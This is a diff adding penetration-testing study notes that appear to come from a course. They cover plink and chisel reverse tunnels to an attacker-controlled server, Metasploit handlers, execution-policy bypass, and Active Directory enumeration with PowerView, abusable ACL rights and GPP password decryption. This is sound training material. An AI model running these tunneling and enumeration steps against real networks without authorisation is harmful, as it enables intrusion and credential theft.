+Plink.exe usage:
+`C:\Windows\Temp\plink.exe -ssh -l <USERNAME> -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <SSH_SERVER_IP>`
+
+## Tunneling Through Deep Packet Inspection
+
+### chisel
+
+Install:
+`sudo apt install chisel`
+
+Simple usage (client):
+`chisel client <SERVER_IP>:<PORT> <local-host>:<local-port>:<remote-host>:<remote-port>/<protocol>`
+
+If chisel server has `--reverse` enabled, then prepending the "remote" with `R:` to create a reverse tunnel, ie it makes the server open a listennig port which fowards traffic to the port to the client.
+
+> Example: `chisel 192.168.11.84:8080 R:socks`
+> This connects to the server at 192.168.11.84:8080, and tells it to open a listening socks socket (default is port 1080).
+
+## The Metasploit Framework
+
+### Using Metasploit Payloads
+
+Example searching for payloads in msfvenom:
+`msfvenom -l payloads --platform windows --arch x64`
+
+In msfconsole, search for handlers by providing space separated search terms, eg:
+`search multi http`
+
+To use the multi handler: `use multi/handler`
+
+### Post Exploitation
+
+In 20.3.2, one lesson uses `powershell -ep bypass`. Not sure why this was needed - would be good to look into.
+
+	You can use Metasploit to bypass UAC. Just typ 
+
+After getting a callback, you can background your handler by entering `bg`.
+
+### Automating Metasploit
+
+View pre-made automation resource scripts:
+`ls -l /usr/share/metasploit-framework/scripts/resource`
+
+If you're script isn't there, you may have metasploit installed somewhere else. Try using `locate` to search for a pre-made resource script such as `portscan.rc`.
+
+## Active Directory
+
+AD contains critical information about the environment, storing information about users, groups, and computers, each referred to as objects. Permissions set on each object dictate the privileges that object has within the domain.
+
+### Manual Enumeration
+
+#### Enumertaion with Legacy Windows Tools
+
+There's tons of information in AD. A good place to start is with enumerating users and groups:
+
+Enumerate users on the domain:
+`net user /domain`
+
+Get info about a domain user (including whether they are a domain admin):
+`net user <username> /domain`
+
+Enumerate domain groups:
+`net group /domain`
+
+Get info about a domain group (including which members are part of the group):
+`net user <group_name> /domain`
+
+#### Enumeration with Powershell and .NET Classes
+
+AD enumeration relies on LDAP. When a domain machine searches for an object, like a printer, or when we query user or group objects, LDAP is used as the communication channel for the query. In other words, LDAP is the protocol used to communicate with Active Directory.
+
+LDAP path prototype:
+`LDAP://HostName[:PortNumber][/DistinguishedName]`
+
+The [DistinguishedName](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names) (DN) uniquely identifies an object in AD.
+
+Example of a DN:
+`CN=Stephanie,CN=Users,DC=corp,DC=com`
+
+When reading a DN, we start with the Domain Component objects on the right side and move to the left. In the example above, we have four components, starting with two components named DC=corp,DC=com. The Domain Component objects as mentioned above represent the top of an LDAP tree following the required naming standard.
+
+Continuing through the DN, CN=Users represents the Common Name for the container where the user object is stored (also known as the parent container). Finally, all the way to the left, CN=Stephanie represents the Common Name for the user object itself, which is also lowest in the hierarchy.
+
+When enumerating AD, only the [Primary Domain Controller](https://learn.microsoft.com/en-GB/troubleshoot/windows-server/identity/fsmo-roles) (PDC) has the most up to date info. There can only be one PDC per domain. To find the PDC, we ned to find the DC holding the *PdcRoleOwner* property.
+
+By default, there are protections on Windows that prevent us from accidentally running a powershell script. If you start powershell with the `-ep bypass` option, then you can run custom scripts from powershell.
+
+```cmd
+powershell -ep bypass
+```
+
+#### Adding Search Functionality to our Script
+
+We can add search functionality to our enumeration script by using the [DirectoryEntry](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0) and [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0) .NET classes.
+
+```
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = "LDAP://$PDC/$DN"
+
+# This variable encapsulates our LDAP path
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.FindAll()	# this will generate a lot of output
+```
+
+The final `.FindAll()` command there generates a lot of output. We can use the `DirectorySearcher`'s `.filter` method to cut this down.
+
+```
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = "LDAP://$PDC/$DN"
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter="samAccountType=805306368"
+$dirsearcher.FindAll()
+```
+
+This still generates a lot of output; we want to cut it down further. When enumerating AD, we are interested in the attributes of each object which are stored in the *Properties* field.
+
+This script iterates through each object in the returned search result and prints out each property on its own line.
+
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = $domainObj.PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = "LDAP://$PDC/$DN"
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter="samAccountType=805306368"
+$result = $dirsearcher.FindAll()
+
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+
+    Write-Host "-------------------------------"
+}
+```
+
+This still produces a lot of output. We can filter based on any property. For example, we can filter based on the *name* property for *jeffadmin*.
+
+We can create a function to help us search AD from the command line:
+
+```
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+```
+
+By using the `Import-Module` in powershell, we can import that function into the context of the powershell prompt.
+
+`Import-Module .\function.ps1`
+
+Now we can search for specific `samAccountType`s
+
+`> LDAPSearch -LDAPQuery "(samAccountType=805306368)"`
+
+We can also search directly for an Object Class, which is a component of AD that defines the object type. Let's use objectClass=group in this case to list all the groups in the domain:
+
+`LDAPSearch -LDAPQuery "(objectclass=group)"`
+
+Our script enumerates more groups than net.exe including Print Operators, IIS_IUSRS, and others. This is because it enumerates all AD objects including Domain Local groups (not just global groups).
+
+In order to print properties and attributes for objects, we'll need to implement the loops we discussed earlier. For now, let's do this directly from the PowerShell command.
+
+To enumerate every group available in the domain and also display the user members, we can pipe the output into a new variable and use a foreach loop that will print each property for a group. This allows us to select specific attributes we are interested in. For example, let's focus on the CN and member attributes:
+
+```
+foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
+>> $group.properties | select {$_.cn}, {$_.member}
+>> }
+```
+
+`net.exe` only lists *user* objects, not group objects. Additionally, net.exe can not display specific attributes. Both these are reasons why custom scripts are useful.
+
+`$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"`
+
+`$sales.properties.member`
+
+`$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"`
+
+`$group.properties.member`
+
+#### AD Enumeration with PowerView
+
+[PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)
+
+See PowerView [docs](https://powersploit.readthedocs.io/en/latest/Recon/) for a list of available commands.
+
+To use PowerView:
+
+1. Run `powershell -ep bypass`
+2. `Import-Module` \path\to\PowerView.ps1`
+
+### Manual Enumeration - Expanding Our Repertoire
+
+#### Enumerating Operating Systems
+
+`Get-NetComputer | select operatingsystem`
+
+*Find-LocalAdminAccess* command scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain.
+
+PsLoggedOn can show you who is logged on, but it relies on the *Remote Registry* service which has not been enabled by default since Windows 8. The only arg you need to provide PsLoggedOn is the name of the machine you want to check. You can get this name via the command `Get-NetComputer | select cn`.
+
+Find out if the current user has local admin privileges on any computers in the domain:
+`Find-LocalAdminAccess`
+
+#### Enumeration Through Service Principal Names
+
+We've been focusing on users and groups and machines - [Service Accounts](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-on-premises) should also be considered; they may be members of high-privileged groups.
+
+Applications must be executed in the context of an operating system user because the user account defines the context in which it is run. But if the service is launched by the system itself (and not directly by a user) then it is run in the context of a *Service Account*.
+
+Pre-defined Service Accounts include [LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account), [LocalService](https://learn.microsoft.com/en-us/windows/win32/services/localservice-account), and [NetworkService](https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account).
+
+When applications like Exchange, MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as [Service Principal Name](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) (SPN) associates a service to a specific service account in Active Directory.
+
+To get the IP address and port number of applications running on servers integrated with AD we can simply enumerate all SPNs in the domain. Therefore, we don't need to run a broad port scan.
+
+Both setspn.exe (which is by default installed on Windows) and `Get-NetUser` from PowerView have the ability to enumerate SPNs in a domain.
+
+```
+# "-L" is used for both servers and users.
+setspn -L iis_service
+```
+
+`Get-NetUser -SPN | select samaccountname,serviceprincipalname`
+
+The `Get-NetUser` command returns a domain name such as `web04.corp.com`; you can get the IP address for it by using `nslookup.exe`:
+
+`nslookup.exe web04.corp.com`
+
+#### Enumerating Object Permissions
+
+AD objects may have permissions applied to them with multiple [Access Control Entries](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) (ACE). ACEs make up the [Access Control List](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) (ACL).
+
+ACLs are consulted when an object tries to access something that needs permissions. For example, when a user tries to access a domain share (also an object), the user will send an *access token* that consists of the user identity and permissions. This token is validated against lsit of entries in the ACL.
+
+This can get complicated; as an attacker, we are mainly interested in a few key permission types. These are the most interesting ones:
+
+```
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+```
+
+Enumerate ACEs with PowerView:
+
+```
+PS C:\Tools> Get-ObjectAcl -Identity stephanie
+
+...
+ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
+ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
+ActiveDirectoryRights  : ReadProperty
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 16
+SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
+AceType                : AccessAllowedObject
+AceFlags               : None
+IsInherited            : False
+InheritanceFlags       : None
+PropagationFlags       : None
+AuditFlags             : None
+...
+```
+
+This produces lot of output; it's most important to pay attention to the seven ACEs listed in the list above.
+
+Use PowerView to convert a SID to a name: 
+
+```
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+```
+
+```
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+#### Enumerating Domain Shares
+
+Playbook:
+
+- Enumerate domain shares (using Find-DomainShare function from PowerView)
+	- `import-module powerview.ps1`
+	- `find-domainshare [-CheckShareAccess]`
+
+Domain shares can contain useful info about the environment. 
+
+PowerView has the **Find-DomainShare** function to find shares in the domain. Using the `-CheckShareAccess` flag causes shares to be displayed only if we have access to them.
+
+- See if you can find [SYSVOL](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx) because it resides on each domain controller and probably holds domain policies and scripts. SYSVOL by default is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name`
+	- Investigate every folder you discover to look for interesting items.
+		- If you find an encrypted password in a folder, if it's was stored through [Group Policy Preferences](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)) then you can decrypt it using [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) in kali.
+
+### Active Directory - Automated Enumeration
+
+#### Collecting Data with SharpHound
+
+- Download the most recent [SharpHound release](https://github.com/BloodHoundAD/SharpHound/releases) zipfile
